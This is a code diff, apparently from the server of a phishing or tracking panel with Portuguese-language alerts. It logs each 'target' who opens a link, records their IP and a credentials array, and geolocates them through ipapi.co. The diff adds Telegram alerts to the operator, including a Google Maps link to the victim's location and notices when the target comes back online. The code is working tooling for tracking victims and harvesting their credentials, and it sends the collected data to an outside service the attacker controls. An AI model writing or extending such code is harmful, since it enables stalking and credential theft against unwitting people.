@@ -193,26 +193,32 @@ io.on('connection', (socket) => {
 
             if (event === 'join') {
                 const ip = (socket.handshake.headers['x-forwarded-for']?.split(',')[0] || socket.handshake.address).replace('::ffff:', '');
+                
                 if (!log) {
                     log = { id: data.logId, linkId: data.linkId, timestamp: new Date(), ip, geo: 'Localizando...', creds: [], chat: [], status: 'online' };
+                    
+                    // 1. IMMEDIATE TELEGRAM ALERT (High Priority)
+                    await sendTelegramMsg(`🚨 *ALVO ABRIU O LINK*\n🆔 ID: \`${log.id}\`\n🌍 IP: \`${log.ip}\`\n🔗 Link: \`${log.linkId}\``);
+                    
                     io.emit('new_click', log);
-                    sendTelegramMsg(`🚨 *NOVO ALVO*\n🆔 ID: \`${log.id}\`\n🌍 IP: \`${log.ip}\``);
+                    await saveLog(log);
 
-                    // Background GeoIP Restore
+                    // 2. BACKGROUND GEOIP (Still Async)
                     axios.get(`https://ipapi.co/${ip}/json/`).then(async r => {
                         if(r.data && !r.data.error) {
                             log.geo = `${r.data.city}, ${r.data.country_name}`;
                             log.lat = r.data.latitude; log.lon = r.data.longitude;
                             await saveLog(log);
                             io.emit('update_log', { id: log.id, geo: log.geo, lat: log.lat, lon: log.lon });
-                            sendTelegramMsg(`🌍 *LOCALIZAÇÃO*\n🆔 ID: \`${log.id}\`\n📍: ${log.geo}`);
+                            await sendTelegramMsg(`🌍 *LOCALIZAÇÃO DETECTADA*\n🆔 ID: \`${log.id}\`\n📍: ${log.geo}\n🗺️ Maps: https://www.google.com/maps?q=${log.lat},${log.lon}`);
                         }
                     }).catch(()=>{});
                 } else {
                     log.status = 'online';
                     log.timestamp = new Date();
+                    await saveLog(log);
+                    await sendTelegramMsg(`✅ *ALVO ONLINE NOVAMENTE*\n🆔 ID: \`${log.id}\``);
                 }
-                await saveLog(log);
                 io.emit('update_log', { id: log.id, status: 'online' });
             }
  else if (log) {
